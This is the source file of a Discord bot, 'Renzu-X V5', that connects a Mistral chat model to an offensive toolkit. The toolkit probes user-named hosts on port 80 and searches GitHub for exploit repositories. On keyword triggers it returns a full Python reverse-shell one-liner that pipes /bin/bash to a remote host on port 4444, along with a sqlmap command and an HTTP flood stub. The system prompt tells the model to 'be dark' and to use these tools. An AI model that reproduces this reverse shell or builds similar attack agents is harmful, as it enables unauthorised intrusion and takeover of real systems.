import 'dotenv/config';
import { Client, GatewayIntentBits } from 'discord.js';
import MistralClient from '@mistralai/mistralai';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import net from 'net';
import express from 'express';

const DEVELOPER_ID = '1104652354655113268';
const PREFIX = '!'; 

const app = express();
app.get('/', (req, res) => res.send('RENZU-X V5: FAST AGENT ONLINE.'));
app.listen(process.env.PORT || 3000);

const uri = process.env.MONGODB_URI;
const mongoClient = uri ? new MongoClient(uri) : null;
let db, knowledgeCache = []; 

async function connectDB() {
    if (!uri) return;
    try {
        await mongoClient.connect();
        db = mongoClient.db('renzu_database');
        const docs = await db.collection('knowledge_base').find().sort({ timestamp: -1 }).limit(10).toArray();
        knowledgeCache = docs.map(d => d.info);
    } catch (err) { console.error('❌ DB Fail'); }
}
connectDB();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});
const mistral = new MistralClient(process.env.MISTRAL_API_KEY);

// --- 🛠️ INTERNAL TOOLS ARSENAL ---
const tools = {
    async portScan(target) {
        const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET LIVE**: \`${host}\` is open on Port 80/443.`); });
            socket.on('error', () => resolve(`🛡️ **SHIELDED**: \`${host}\` rejected connection.`));
            socket.connect(80, host);
        });
    },

    async huntExploits(query) {
        try {
            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit&sort=stars`);
            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
        } catch (e) { return "❌ GitHub Recon fail."; }
    },

    async generatePayload(type, target) {
        const payloads = {
            'dos': `🌩️ HTTP Flood Vector ready for ${target}.`,
            'rev': `🐍 RevShell: \npython -c 'import socket,os,pty;s=socket.socket();s.connect(("${target}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
            'sqli': `💉 SQLi Probe: \`sqlmap -u "${target}" --batch\``
        };
        return payloads[type] || "Module NA.";
    }
};

// --- 🧠 AGENTIC BRAIN ---
async function runSmartAgent(message, input, isDev) {
    const memory = knowledgeCache.length ? `[INTEL]: ${knowledgeCache.join(', ')}` : "";
    const systemPrompt = `IDENTITY: Renzu-X V5 Agent. Respond in Hinglish. Be dark. Use tools if user mentions scan, hunt, or payload. Developer: ${DEVELOPER_ID}. ${memory}`;

    try {
        const res = await mistral.chat({
            model: 'mistral-large-latest',
            messages: [{ role: 'system', content: systemPrompt }, { role: 'user', content: input }]
        });
        
        let reply = res.choices[0].message.content;
        const lowIn = input.toLowerCase();

        if (lowIn.includes('scan')) {
            const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
            if (target) reply += `\n\n**[TERMINAL]**:\n${await tools.portScan(target[0])}`;
        }
        if (lowIn.includes('hunt') || lowIn.includes('find')) {
            reply += `\n\n**[GITSCRAPE]**:\n${await tools.huntExploits(input)}`;
        }
        if (isDev && (lowIn.includes('payload') || lowIn.includes('exploit'))) {
            reply += `\n\n**[SHADOW_PAYLOAD]**:\n${await tools.generatePayload('rev', 'target_ip')}`;
        }

        return message.reply(reply.substring(0, 2000));
    } catch (e) { return message.reply("⚠️ AI Core Error."); }
}

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const input = message.content.slice(PREFIX.length).trim();
    if (!input) return;

    await message.channel.sendTyping();
    await runSmartAgent(message, input, message.author.id === DEVELOPER_ID);
});

client.once('ready', () => console.log('💀 RENZU-X V5 READY.'));
client.login(process.env.DISCORD_TOKEN);
